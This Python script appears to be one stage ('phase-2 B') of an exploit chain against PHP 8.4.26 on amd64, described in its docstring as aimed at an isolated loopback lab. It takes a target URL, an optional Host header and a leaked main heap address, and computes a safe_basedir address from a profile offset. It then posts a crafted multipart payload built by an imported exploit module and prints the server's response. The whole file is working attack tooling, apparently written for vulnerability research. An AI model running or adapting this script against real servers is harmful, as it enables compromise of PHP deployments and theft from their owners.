#!/usr/bin/env python3
"""Send one complete phase-2 B request to the isolated loopback lab."""

from __future__ import annotations

import argparse
import dataclasses
from pathlib import Path
import sys


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import exploit_generic as exploit  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header")
    parser.add_argument("--profile-json")
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    parser.add_argument("--main-heap", required=True, type=lambda value: int(value, 0))
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()

    profile = exploit.load_profile(
        "php-8.4.26-amd64", args.profile_json, args.assignments
    )
    target = exploit.Target.parse(args.url)
    if args.host_header:
        target = dataclasses.replace(target, host_header=args.host_header)
    client = exploit.RawHTTP(
        target,
        timeout=90.0,
        retries=3,
        retry_delay=0.25,
        insecure=False,
        log=exploit.Log(1),
    )
    safe_basedir = args.main_heap + profile.safe_basedir_offset
    body, boundary, query = exploit.build_libphp_b(profile, safe_basedir)
    response = client.post_multipart(body, boundary, path=target.path + query)
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_bytes(response)
    first_line = response.splitlines()[0] if response else b""
    print(
        f"B status={first_line.decode('latin1', 'replace')!r} "
        f"response={len(response)} main={args.main_heap:#x} safe={safe_basedir:#x}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
